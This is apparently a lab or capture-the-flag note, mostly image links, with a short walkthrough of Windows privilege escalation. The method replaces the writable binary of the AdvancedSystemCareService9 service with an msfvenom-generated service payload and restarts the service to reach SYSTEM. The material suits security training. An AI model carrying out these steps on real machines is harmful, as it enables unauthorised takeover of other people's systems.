![image](https://github.com/user-attachments/assets/1f3d6c05-ca11-4415-be32-3a1e95cdf5fb)
![image](https://github.com/user-attachments/assets/05fbd16e-a0c9-4589-8837-712508f02a6e)
![image](https://github.com/user-attachments/assets/b8e859ce-ce02-489a-a567-4ac2b585bed8)
![image](https://github.com/user-attachments/assets/ed4da553-cb7b-48ae-a1ef-43d50769f600)
![image](https://github.com/user-attachments/assets/65a7f909-2a65-4f2f-a0a1-f2370b189f48)
![image](https://github.com/user-attachments/assets/7f42902c-f931-4b28-894f-f4e5289d2497)
![image](https://github.com/user-attachments/assets/ede0bea3-f4ec-48db-84d4-1212bfc57d60)
![image](https://github.com/user-attachments/assets/df30ba52-5326-4781-9adc-e97e1ce9761c)
![image](https://github.com/user-attachments/assets/9c64fa34-4327-4053-ab06-a8e1d477190f)
![image](https://github.com/user-attachments/assets/44db26ca-ace2-49fd-86e2-0ea4189ad542)
![image](https://github.com/user-attachments/assets/c654f5d6-c79f-4908-ab09-f254b8f84b09)
![image](https://github.com/user-attachments/assets/59087828-022b-4739-bfa8-f96f496984d6)

AdvancedSystemCareService9 --> CanRestart =True --> app ASCService.exe write-able

![image](https://github.com/user-attachments/assets/e3fbaf49-2cbe-4e08-84c7-99faf50f35be)
![image](https://github.com/user-attachments/assets/917edfc3-ba1a-473c-82b1-b8272cc6fe94)
![image](https://github.com/user-attachments/assets/ceecf8ff-2050-463d-a8b5-7cbd7e989729)
![image](https://github.com/user-attachments/assets/6cb1f67f-03f7-439d-ac5e-6c2b9eaad4d5)

1. Check service status --> Get-Service -Name "AdvancedSystemCareService9"

2. Stop service --> Stop-Service AdvancedSystemCareService9

3. Generate payload  --> msfvenom -f exe-service -o ASCService.exe

4. Replace original service exe with payload

5. Restart service --> Restart-Service -Name "AdvancedSystemCareService9"

6. PrivEsc to SYSTEM

7. If run winPEAS.exe, should see unquoted path for the service
